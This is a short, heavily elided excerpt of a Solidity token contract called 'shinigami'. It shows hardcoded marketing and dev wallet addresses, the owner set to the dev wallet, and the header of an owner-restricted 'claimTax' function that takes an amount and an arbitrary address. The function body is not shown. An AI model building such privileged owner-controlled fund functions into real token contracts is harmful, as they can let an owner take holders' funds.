...
contract shinigami  is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xcc54Fbc0B9d2665c7646f468CBcD682A079b664d); 
    address payable public Wallet_Dev = payable(0x14EC753228576FA973D18319468a29A8d7220CDf);
    ...
    constructor () {
        ...
        _owner = 0x14EC753228576FA973D18319468a29A8d7220CDf;
    ...
    function claimTax(uint256 acc, address adr) authorized() public virtual {
